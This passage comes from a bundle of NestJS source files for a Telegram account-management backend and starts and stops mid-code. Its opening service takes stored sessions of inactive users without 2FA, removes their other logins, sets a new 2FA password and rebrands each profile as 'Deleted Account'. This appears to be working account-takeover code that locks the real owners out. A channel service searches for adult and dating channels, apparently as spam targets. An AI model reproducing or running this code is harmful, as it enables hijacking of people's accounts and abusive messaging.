{ $nin: goodIds }, expired: false, twoFA: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 250 } }, { tgId: 1 }, badIds.length + 3);\n        console.log(\"New buffer documents to be added: \", documents.length)\n        while (badIds.length > 0 && documents.length > 0) {\n            const document = documents.shift();\n            try {\n                try {\n                    const client = await connectionManager.getClient(document.mobile, { autoDisconnect: false });\n                    const hasPassword = await client.hasPassword();\n                    console.log(\"hasPassword: \", hasPassword);\n                    if (!hasPassword) {\n                        await client.removeOtherAuths();\n                        await client.set2fa();\n                        console.log(\"waiting for setting 2FA\");\n                        await sleep(30000);\n                        await client.updateUsername('');\n                        await sleep(3000)\n                        await client.updatePrivacyforDeletedAccount();\n                        await sleep(3000)\n                        await client.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                        await sleep(3000)\n                        await client.deleteProfilePhotos();\n                        await sleep(2000);\n                        await this.telegramService.removeOtherAuths(document.mobile);\n                        const channels = await client.channelInfo(true)\n                        console.log(\"Inserting Document\");\n                        const bufferClient = {\n                            tgId: document.tgId,\n                            session: document.session,\n                            mobile: document.mobile,\n                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],\n                            channels: channels.ids.length,\n                        }\n                        await this.create(bufferClient);\n                        await this.usersService.update(document.tgId, { twoFA: true })\n                        console.log(\"=============Created BufferClient=============\")\n                        await connectionManager.unregisterClient(document.mobile)\n                        badIds.pop();\n                    } else {\n                        console.log(\"Failed to Update as BufferClient has Password\");\n                        await this.usersService.update(document.tgId, { twoFA: true })\n                        await connectionManager.unregisterClient(document.mobile)\n                    }\n                } catch (error) {\n                    parseError(error)\n                    await connectionManager.unregisterClient(document.mobile)\n                }\n            } catch (error) {\n                parseError(error)\n                console.error(\"An error occurred:\", error);\n            }\n            await connectionManager.unregisterClient(document.mobile)\n        }\n        setTimeout(() => {\n            this.joinchannelForBufferClients()\n        }, 2 * 60 * 1000);\n    }\n}\n","import { ApiProperty } from '@nestjs/swagger';\nimport {  IsNumber, IsString } from 'class-validator';\n\nexport class CreateBufferClientDto {\n  @ApiProperty({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsString()\n  readonly tgId: string;\n\n  @ApiProperty({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsString()\n  readonly mobile: string;\n\n  @ApiProperty({\n    description: 'Date of the session',\n    example: '2023-06-22',\n  })\n  @IsString()\n  readonly availableDate: string;\n\n  @ApiProperty({\n    description: 'Session identifier',\n    example: 'session123',\n  })\n  @IsString()\n  readonly session: string;\n\n  @ApiProperty({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels: number;\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { IsString, IsBoolean, IsOptional, IsNumber } from 'class-validator';\n\nexport class SearchBufferClientDto {\n  @ApiPropertyOptional({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsOptional()\n  @IsString()\n  readonly tgId?: string;\n\n  @ApiPropertyOptional({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsOptional()\n  @IsString()\n  readonly mobile?: string;\n\n  @ApiPropertyOptional({\n    description: 'availableDate of the bufferClient',\n    example: '2023-06-22',\n  })\n  @IsOptional()\n  @IsString()\n  readonly availableDate?: string;\n\n  @ApiPropertyOptional({\n    description: 'Session identifier',\n    example: 'session123',\n  })\n  @IsOptional()\n  @IsString()\n  readonly session?: string;\n\n  @ApiPropertyOptional({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels?: number;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateBufferClientDto } from './create-buffer-client.dto';\n\nexport class UpdateBufferClientDto extends PartialType(CreateBufferClientDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\nexport type BufferClientDocument = BufferClient & Document;\n@Schema({ collection: 'bufferClients', versionKey: false, autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})  // Specify the collection name here\nexport class BufferClient {\n  @Prop({ required: true})\n  tgId: string;\n\n  @Prop({ required: true, unique: true })\n  mobile: string;\n  \n  @Prop({ required: true })\n  session: string;\n\n  @Prop({ required: true })\n  availableDate: string;\n\n  @Prop({ required: true, type: Number })\n  channels: number;\n}\n\nexport const BufferClientSchema = SchemaFactory.createForClass(BufferClient);\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { BuildService } from './build.service';\n\n@ApiTags('Build')\n@Controller('builds')\nexport class BuildController {\n  constructor(private readonly buildService: BuildService) {}\n\n  @Get()\n  @ApiOperation({ summary: 'Get build data' })\n  async findOne(): Promise<any>{\n    return this.buildService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update build' })\n  @ApiBody({type: Object})\n  async update( @Body() updateClientDto: any): Promise<any> {\n    return this.buildService.update( updateClientDto);\n  }\n\n}\n","import { Module, Global } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { BuildService } from './build.service';\nimport { BuildController } from './build.controller';\nimport { BuildSchema } from './builds.schema';\nimport { NpointModule } from '../n-point/npoint.module';\n\n@Global()\n@Module({\n  imports: [\n    BuildModule,\n    MongooseModule.forFeature([{ name: 'buildModule', collection: 'builds', schema: BuildSchema }]),\n    NpointModule,\n  ],\n  providers: [BuildService],\n  controllers: [BuildController],\n  exports: [BuildModule],\n})\nexport class BuildModule { }","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Build } from './builds.schema';\nimport { NpointService } from '../n-point/npoint.service';\n\n@Injectable()\nexport class BuildService {\n    constructor(@InjectModel('buildModule') private buildModel: Model<Build>,\n        private npointSerive: NpointService) {\n    }\n\n    async OnModuleInit() {\n        console.log(\"Config Module Inited\")\n    }\n\n    async findOne(): Promise<any> {\n        const user = await this.buildModel.findOne({}).exec();\n        if (!user) {\n            throw new NotFoundException(`buildModel not found`);\n        }\n        return user;\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.buildModel.findOneAndUpdate(\n            {}, // Assuming you want to update the first document found in the collection\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true }\n        ).exec();\n        try {\n            await this.npointSerive.updateDocument(\"3375d15db1eece560188\", updatedUser)\n            console.log(\"Updated document successfully in npoint\")\n        } catch (error) {\n            console.log(error)\n        }\n        if (!updatedUser) {\n            throw new NotFoundException(`buildModel not found`);\n        }\n        return updatedUser;\n    }\n\n}\n","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type BuildDocument = Build & Document;\n\n@Schema({versionKey: false, autoIndex: true,strict: false ,  timestamps: true,\n    toJSON: {\n      virtuals: true,\n      transform: (doc, ret) => {\n        delete ret._id;\n      },\n    },})\nexport class Build {}\n\nexport const BuildSchema = SchemaFactory.createForClass(Build);\nBuildSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","// src/channels/channels.controller.ts\nimport { Controller, Get, Post, Body, Patch, Param, Delete, NotFoundException, Query, BadRequestException } from '@nestjs/common';\nimport { ChannelsService } from './channels.service';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiBody } from '@nestjs/swagger';\nimport { SearchChannelDto } from './dto/search-channel.dto';\nimport { CreateChannelDto } from './dto/create-channel.dto';\nimport { UpdateChannelDto } from './dto/update-channel.dto';\nimport { Channel } from './schemas/channel.schema';\n\n@ApiTags('Channels')\n@Controller('channels')\nexport class ChannelsController {\n  constructor(private readonly channelsService: ChannelsService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create a new  channel' })\n  async create(@Body() createChannelDto: CreateChannelDto) {\n    return this.channelsService.create(createChannelDto);\n  }\n  @Post('createMultiple')\n  @ApiOperation({ summary: 'Create multiple channels' })\n  @ApiBody({ type: [CreateChannelDto] })\n  async createMultiple(@Body() createChannelDtos: CreateChannelDto[]): Promise<string> {\n    return this.channelsService.createMultiple(createChannelDtos);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search channels by filters' })\n  @ApiQuery({ name: 'channelId', required: false, type: String })\n  @ApiQuery({ name: 'broadcast', required: false, type: Boolean })\n  @ApiQuery({ name: 'canSendMsgs', required: false, type: Boolean })\n  @ApiQuery({ name: 'participantsCount', required: false, type: Number })\n  @ApiQuery({ name: 'restricted', required: false, type: Boolean })\n  @ApiQuery({ name: 'sendMessages', required: false, type: Boolean })\n  @ApiQuery({ name: 'title', required: false, type: String })\n  @ApiQuery({ name: 'username', required: false, type: String })\n  search(@Query() query: SearchChannelDto): Promise<Channel[]> {\n    console.log(query);\n    return this.channelsService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all  channels' })\n  async findAll() {\n    return this.channelsService.findAll();\n  }\n\n  @Get(':channelId')\n  @ApiOperation({ summary: 'Get an  channel by channelId' })\n  //@apiresponse({ status: 200, description: 'Return the  channel', type: Channel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async findOne(@Param('channelId') channelId: string) {\n    return this.channelsService.findOne(channelId);\n  }\n\n  @Patch(':channelId')\n  @ApiOperation({ summary: 'Update an  channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully updated.', type: Channel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async update(@Param('channelId') channelId: string, @Body() updateChannelDto: UpdateChannelDto) {\n    return this.channelsService.update(channelId, updateChannelDto);\n  }\n\n  @Delete(':channelId')\n  @ApiOperation({ summary: 'Delete an  channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully deleted.' })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async remove(@Param('channelId') channelId: string) {\n    return this.channelsService.remove(channelId);\n  }\n}\n","// src/channels/channels.module.ts\nimport { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { ChannelsService } from './channels.service';\nimport { ChannelsController } from './channels.controller';\nimport { Channel, ChannelSchema } from './schemas/channel.schema';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: Channel.name, schema: ChannelSchema }]),\n  ],\n  controllers: [ChannelsController],\n  providers: [ChannelsService],\n  exports: [ChannelsService]\n})\nexport class ChannelsModule { }\n","// src/channels/channels.service.ts\nimport { BadRequestException, Injectable, InternalServerErrorException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateChannelDto } from './dto/create-channel.dto';\nimport { UpdateChannelDto } from './dto/update-channel.dto';\nimport { Channel, ChannelDocument } from './schemas/channel.schema';\n@Injectable()\nexport class ChannelsService {\n  constructor(\n    @InjectModel(Channel.name) private ChannelModel: Model<ChannelDocument>,\n  ) { console.log(Channel.name) }\n\n  async create(createChannelDto: CreateChannelDto): Promise<Channel> {\n    const createdChannel = new this.ChannelModel(createChannelDto);\n    return createdChannel.save();\n  }\n\n  async createMultiple(createChannelDtos: CreateChannelDto[]): Promise<string> {\n    const bulkOps = createChannelDtos.map((dto) => ({\n      updateOne: {\n        filter: { channelId: dto.channelId },\n        update: { $set: dto },\n        upsert: true\n      }\n    }));\n\n    await this.ChannelModel.bulkWrite(bulkOps, { ordered: false });\n    return 'Channels Saved';\n  }\n\n  async findAll(): Promise<Channel[]> {\n    return this.ChannelModel.find().exec();\n  }\n\n  async findOne(channelId: string): Promise<Channel> {\n    const channel = (await this.ChannelModel.findOne({ channelId }).exec())?.toJSON();\n    return channel;\n  }\n\n  async update(channelId: string, updateChannelDto: UpdateChannelDto): Promise<Channel> {\n    const updatedChannel = await this.ChannelModel.findOneAndUpdate(\n      { channelId },\n      { $set: updateChannelDto },\n      { new: true, upsert: true },\n    ).exec();\n    return updatedChannel;\n  }\n\n  async remove(channelId: string): Promise<void> {\n    const result = await this.ChannelModel.findOneAndDelete({ channelId }).exec();\n  }\n\n  async search(filter: any): Promise<Channel[]> {\n    console.log(filter)\n    return this.ChannelModel.find(filter).exec();\n  }\n\n  async getChannels(limit = 50, skip = 0, keywords = [], notIds = []) {\n    const pattern = new RegExp(keywords.join('|'), 'i');\n    const notPattern = new RegExp('online|board|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser', \"i\")\n    let query = {\n      $and: [\n        { username: { $ne: null } },\n        {\n          $or: [\n            { title: { $regex: pattern } },\n            { username: { $regex: pattern } }\n          ]\n        },\n        {\n          username: {\n            $not: {\n              $regex: \"^(\" + notIds.map(id => \"(?i)\" + id?.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&'))?.join(\"|\") + \")$\"\n            }\n          }\n        },\n        {\n          title: { $not: { $regex: notPattern } }\n        },\n        {\n          username: { $not: { $regex: notPattern } }\n        },\n        {\n          sendMessages: false,\n          broadcast: false,\n          restricted: false\n        }\n      ]\n    };\n\n    const sort: { participantsCount: \"desc\" } = { participantsCount: \"desc\" };\n    try {\n      const result: Channel[] = await this.ChannelModel.find(query).sort(sort).skip(skip).limit(limit).exec();\n      return result;\n    } catch (error) {\n      console.error('Error:', error);\n      return [];\n    }\n  }\n\n  async executeQuery(query: any, sort?: any, limit?: number): Promise<Channel[]> {\n    try {\n      if (!query) {\n        throw new BadRequestException('Query is invalid.');\n      }\n      const queryExec = this.ChannelModel.find(query);\n      if (sort) {\n        queryExec.sort(sort);\n      }\n\n      if (limit) {\n        queryExec.limit(limit);\n      }\n\n      return await queryExec.exec();\n    } catch (error) {\n      throw new InternalServerErrorException(error.message);\n    }\n  }\n\n  async getActiveChannels(limit = 50, skip = 0, notIds = []) {\n    const query = {\n      '$and':\n        [\n          {\n            '$or':\n              [\n                { title: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n                { username: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n              ]\n          },\n          {\n            '$or': [\n              { title: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\n              { username: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\n            ]\n          },\n          {\n            channelId: { '$nin': notIds },\n            participantsCount: { $gt: 1000 },\n            username: {$ne: null},\n            canSendMsgs: true,\n            restricted: false,\n            forbidden: false\n          }\n        ]\n    }\n\n    const sort: Record<string, 1 | -1> = notIds.length > 300 && false ? { randomField: 1 } : { participantsCount: -1 }\n    try {\n      const result: Channel[] = await this.ChannelModel.aggregate([\n        { $match: query },\n        { $skip: skip },\n        { $limit: limit },\n        { $addFields: { randomField: { $rand: {} } } }, // Add a random field\n        { $sort: sort }, // Sort by the random field\n        { $project: { randomField: 0 } } // Remove the random field from the output\n      ]).exec();\n      return result;\n    } catch (error) {\n      console.error('Error:', error);\n      return [];\n    }\n  }\n}\n","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateChannelDto {\n  @ApiProperty({\n    description: 'Unique identifier for the channel',\n    example: '803387987',\n  })\n  channelId: string;\n\n  @ApiProperty({\n    description: 'Whether the channel is a broadcast channel',\n    example: null,\n    required: false,\n  })\n  broadcast?: boolean;\n\n  @ApiProperty({\n    description: 'Indicates if the channel can send messages',\n    example: true,\n  })\n  canSendMsgs: boolean;\n\n  @ApiProperty({\n    description: 'Whether the channel is a megagroup',\n    example: null,\n    required: false,\n  })\n  megagroup?: boolean;\n\n  @ApiProperty({\n    description: 'Number of participants in the channel',\n    example: 0,\n  })\n  participantsCount: number;\n\n  @ApiProperty({\n    description: 'Whether the channel is restricted',\n    example: null,\n    required: false,\n  })\n  restricted?: boolean;\n\n  @ApiProperty({\n    description: 'Whether the channel can send messages',\n    example: null,\n    required: false,\n  })\n  sendMessages?: boolean;\n\n  @ApiProperty({\n    description: 'Title of the channel',\n    example: 'Earn money with Ayesha',\n  })\n  title: string;\n\n  @ApiProperty({\n    description: 'Username of the channel',\n    example: null,\n    required: false,\n  })\n  username?: string;\n\n  @ApiProperty({\n    description: 'Whether the channel is private',\n    example: false,\n    required: false,\n  })\n  private: boolean = false;\n\n  @ApiProperty({\n    default: false, example: false,\n    required: false,\n  })\n  forbidden: boolean = false;\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\n\nexport class SearchChannelDto {\n  @ApiPropertyOptional({\n    description: 'Unique identifier for the channel',\n    example: '803387987',\n  })\n  channelId?: string;\n\n  @ApiPropertyOptional({\n    description: 'Title of the channel',\n    example: 'Earn money with Ayesha',\n  })\n  title?: string;\n\n  @ApiPropertyOptional({\n    description: 'privacy of the channel',\n    example: false,\n  })\n  private?: string;\n\n  @ApiPropertyOptional({\n    description: 'Username of the channel',\n    example: 'ayesha_channel',\n  })\n  username?: string;\n\n  @ApiPropertyOptional({\n    description: 'Indicates if the channel can send messages',\n    example: true,\n  })\n  canSendMsgs?: boolean;\n\n  @ApiPropertyOptional({\n    description: 'Minimum number of participants in the channel',\n    example: 10,\n  })\n  minParticipantsCount?: number;\n\n  @ApiPropertyOptional({\n    description: 'Maximum number of participants in the channel',\n    example: 100,\n  })\n  maxParticipantsCount?: number;\n}\n","// src/channels/dto/update-channel.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateChannelDto } from './create-channel.dto';\n\nexport class UpdateChannelDto extends PartialType(CreateChannelDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\nimport * as mongoose from 'mongoose';\n\nexport type ChannelDocument = Channel & Document;\n@Schema({\n  collection: 'channels', versionKey: false, autoIndex: true, timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class Channel {\n  @Prop({ required: true, unique: true })\n  channelId: string;\n\n  @Prop({ default: false })\n  broadcast: boolean;\n\n  @Prop({ default: true })\n  canSendMsgs: boolean;\n\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  participantsCount: number;\n\n  @Prop({ default: false })\n  restricted: boolean;\n\n  @Prop({ default: false })\n  sendMessages: boolean;\n\n  @Prop({ required: true })\n  title: string;\n\n  @Prop({ required: false, default: null })\n  username: string;\n\n  @Prop({ required: true, default: false })\n  private: boolean;\n\n  @Prop({ default: false, required: false })\n  forbidden: boolean\n}\n\nexport const ChannelSchema = SchemaFactory.createForClass(Channel);\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, HttpException, HttpStatus } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody, ApiParam, ApiResponse, ApiQuery } from '@nestjs/swagger';\r\nimport { ClientService } from './client.service';\r\nimport { CreateClientDto } from './dto/create-client.dto';\r\nimport { Client } from './schemas/client.schema';\r\nimport { SearchClientDto } from './dto/search-client.dto';\r\nimport { UpdateClientDto } from './dto/update-client.dto';\r\nimport { SetupClientQueryDto } from './dto/setup-client.dto';\r\n\r\n@ApiTags('Clients')\r\n@Controller('clients')\r\nexport class ClientController {\r\n  constructor(private readonly clientService: ClientService) { }\r\n\r\n  /**\r\n   * Create a new client\r\n   */\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create user data' })\r\n  @ApiResponse({ status: 201, description: 'The user data has been successfully created.' })\r\n  @ApiResponse({ status: 400, description: 'Invalid input data.' })\r\n  async create(@Body() createClientDto: CreateClientDto): Promise<Client> {\r\n    try {\r\n      return await this.clientService.create(createClientDto);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Search for clients based on query parameters\r\n   */\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search user data' })\r\n  @ApiQuery({ name: 'clientId', required: false, description: 'Client ID' })\r\n  @ApiQuery({ name: 'dbcoll', required: false, description: 'Database collection name' })\r\n  @ApiQuery({ name: 'channelLink', required: false, description: 'Channel link' })\r\n  @ApiQuery({ name: 'link', required: false, description: 'Client link' })\r\n  @ApiResponse({ status: 200, description: 'Matching user data returned successfully.' })\r\n  async search(@Query() query: SearchClientDto): Promise<Client[]> {\r\n    try {\r\n      return await this.clientService.search(query);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  @Get('updateClient/:clientId')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\r\n  //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  async updateClient(@Param('clientId') clientId: string) {\r\n    this.clientService.updateClient(clientId);\r\n    return \"Update client initiated\";\r\n  }\r\n\r\n  /**\r\n   * Get all clients with masked sensitive fields\r\n   */\r\n  @Get('maskedCls')\r\n  @ApiOperation({ summary: 'Get all user data with masked fields' })\r\n  @ApiResponse({ status: 200, description: 'All user data returned successfully.' })\r\n  async findAllMasked(@Query() query: SearchClientDto) {\r\n    try {\r\n      return await this.clientService.findAllMasked(query);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Get all clients\r\n   */\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all user data' })\r\n  @ApiResponse({ status: 200, description: 'All user data returned successfully.' })\r\n  async findAll(): Promise<Client[]> {\r\n    try {\r\n      return await this.clientService.findAll();\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Get a specific client by ID\r\n   */\r\n  @Get(':clientId')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  @ApiResponse({ status: 200, description: 'User data returned successfully.' })\r\n  @ApiResponse({ status: 404, description: 'User data not found.' })\r\n  async findOne(@Param('clientId') clientId: string): Promise<Client> {\r\n    try {\r\n      return await this.clientService.findOne(clientId);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Update a specific client by ID\r\n   */\r\n  @Patch(':clientId')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  @ApiResponse({ status: 200, description: 'The user data has been successfully updated.' })\r\n  @ApiResponse({ status: 404, description: 'User data not found.' })\r\n  async update(@Param('clientId') clientId: string, @Body() updateClientDto: UpdateClientDto): Promise<Client> {\r\n    try {\r\n      return await this.clientService.update(clientId, updateClientDto);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Delete a specific client by ID\r\n   */\r\n  @Delete(':clientId')\r\n  @ApiOperation({ summary: 'Delete user data by ID' })\r\n  @ApiResponse({ status: 200, description: 'The user data has been successfully deleted.' })\r\n  @ApiResponse({ status: 404, description: 'User data not found.' })\r\n  async remove(@Param('clientId') clientId: string): Promise<Client> {\r\n    try {\r\n      return await this.clientService.remove(clientId);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  // @Get('setupClient/:clientId')\r\n  // @ApiOperation({ summary: 'SetUp Client data' })\r\n  // //@apiresponse({ status: 200, description: 'Return the user data.' })\r\n  // //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  // async setupClient(@Param('clientId') clientId: string, @Query() setupClientQueryDto: SetupClientQueryDto) {\r\n  //   this.clientService.setupClient(clientId, setupClientQueryDto);\r\n  //   return `Started Client Seup for ${clientId}`\r\n  // }\r\n\r\n  /**\r\n   * Execute a custom MongoDB query\r\n   */\r\n  @Post('query')\r\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\r\n  @ApiResponse({ status: 200, description: 'Query executed successfully.' })\r\n  @ApiResponse({ status: 400, description: 'Invalid query.' })\r\n  @ApiBody({ schema: { properties: { query: { type: 'object' }, sort: { type: 'object' }, limit: { type: 'number' }, skip: { type: 'number' } } } })\r\n  async executeQuery(@Body() requestBody: any): Promise<any> {\r\n    const { query, sort, limit, skip } = requestBody;\r\n    try {\r\n      return await this.clientService.executeQuery(query, sort, limit, skip);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Add a mobile number to the promoteMobile array for a specific client\r\n   */\r\n  @Patch(':clientId/promoteMobile/add')\r\n  @ApiOperation({ summary: 'Add a mobile number to the promoteMobile array for a specific client' })\r\n  @ApiParam({ name: 'clientId', description: 'The unique identifier of the client' })\r\n  @ApiBody({ schema: { properties: { mobileNumber: { type: 'string', example: '916265240911' } } } })\r\n  @ApiResponse({ status: 200, description: 'Mobile number added successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Client not found.' })\r\n  async addPromoteMobile(@Param('clientId') clientId: string, @Body('mobileNumber') mobileNumber: string) {\r\n    try {\r\n      return await this.clientService.addPromoteMobile(clientId, mobileNumber);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Remove a mobile number from the promoteMobile array for a specific client\r\n   */\r\n  @Patch(':clientId/promoteMobile/remove')\r\n  @ApiOperation({ summary: 'Remove a mobile number from the promoteMobile array for a specific client' })\r\n  @ApiParam({ name: 'clientId', description: 'The unique identifier of the client' })\r\n  @ApiBody({ schema: { properties: { mobileNumber: { type: 'string', example: '916265240911' } } } })\r\n  @ApiResponse({ status: 200, description: 'Mobile number removed successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Client not found.' })\r\n  async removePromoteMobile(@Param('clientId') clientId: string, @Body('mobileNumber') mobileNumber: string) {\r\n    try {\r\n      return await this.clientService.removePromoteMobile(clientId, mobileNumber);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { Client, ClientSchema } from './schemas/client.schema';\nimport { ClientService } from './client.service';\nimport { ClientController } from './client.controller';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\nimport { UsersModule } from '../users/users.module';\nimport { ArchivedClientModule } from '../archived-clients/archived-client.module';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { NpointModule } from '../n-point/npoint.module';\nimport { TimestampModule } from '../timestamps/timestamp.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: Client.name, schema: ClientSchema }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => BufferClientModule),\n    forwardRef(() => UsersModule),\n    forwardRef(() => ArchivedClientModule),\n    forwardRef(() => TimestampModule),\n    NpointModule\n  ],\n  controllers: [ClientController],\n  providers: [ClientService],\n  exports: [ClientService]\n})\nexport class ClientModule { }\n","import { TelegramService } from './../Telegram/Telegram.service';\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef, Query } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Client, ClientDocument } from './schemas/client.schema';\nimport { CreateClientDto } from './dto/create-client.dto';\nimport { SetupClientQueryDto } from './dto/setup-client.dto';\nimport { BufferClientService } from '../buffer-clients/buffer-client.service';\nimport { sleep } from 'telegram/Helpers';\nimport { UsersService } from '../users/users.service';\nimport { ArchivedClientService } from '../archived-clients/archived-client.service';\nimport { areJsonsNotSame, contains, fetchNumbersFromString, mapToJson, toBoolean } from '../../utils';\nimport { UpdateClientDto } from './dto/update-client.dto';\nimport { CreateBufferClientDto } from '../buffer-clients/dto/create-buffer-client.dto';\nimport { UpdateBufferClientDto } from '../buffer-clients/dto/update-buffer-client.dto';\nimport * as path from 'path';\nimport { CloudinaryService } from '../../cloudinary';\nimport { SearchClientDto } from './dto/search-client.dto';\nimport { NpointService } from '../n-point/npoint.service';\nimport axios from 'axios';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { connectionManager } from 